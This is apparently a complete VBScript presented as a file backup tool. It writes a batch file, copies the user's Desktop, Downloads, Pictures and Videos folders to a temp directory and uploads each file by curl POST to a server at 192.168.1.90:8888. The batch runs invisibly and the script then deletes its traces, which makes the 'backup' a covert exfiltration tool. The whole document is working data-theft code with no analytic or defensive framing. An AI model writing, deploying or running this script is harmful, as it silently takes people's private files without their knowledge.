Set WshShell = CreateObject("WScript.Shell")

' Write the batch file to a temporary location
batchFile = WshShell.ExpandEnvironmentStrings("%TEMP%") & "\backup_files.bat"
Set fso = CreateObject("Scripting.FileSystemObject")
Set batch = fso.CreateTextFile(batchFile, True)

batch.WriteLine("@echo off")
batch.WriteLine("REM Set the target URL of your Python server")
batch.WriteLine("set server_url=http://192.168.1.90:8888/upload")

batch.WriteLine("REM Define the directories to copy files from")
batch.WriteLine("set directories=""%USERPROFILE%\Desktop"" ""%USERPROFILE%\Downloads"" ""%USERPROFILE%\Pictures"" ""%USERPROFILE%\Videos""")

batch.WriteLine("REM Create a temporary directory to store the files before upload")
batch.WriteLine("set temp_dir=%TEMP%\backup_files")
batch.WriteLine("mkdir %temp_dir%")

batch.WriteLine("REM Copy files from each directory to the temporary directory")
batch.WriteLine("for %%d in (%directories%) do (")
batch.WriteLine("    xcopy ""%%d\*"" ""%temp_dir%\*"" /S /Y /I")
batch.WriteLine(")")

batch.WriteLine("REM Upload the files to the Python server")
batch.WriteLine("for %%f in (%temp_dir%\*) do (")
batch.WriteLine("    curl -X POST -F ""file=@%%f"" %server_url%")
batch.WriteLine(")")

batch.WriteLine("REM Clean up the temporary directory")
batch.WriteLine("rd /S /Q %temp_dir%")

batch.WriteLine("echo Backup completed.")
batch.WriteLine("pause")
batch.Close

' Execute the batch file invisibly
WshShell.Run batchFile, 0, True

' Clean up the temporary batch file
fso.DeleteFile batchFile
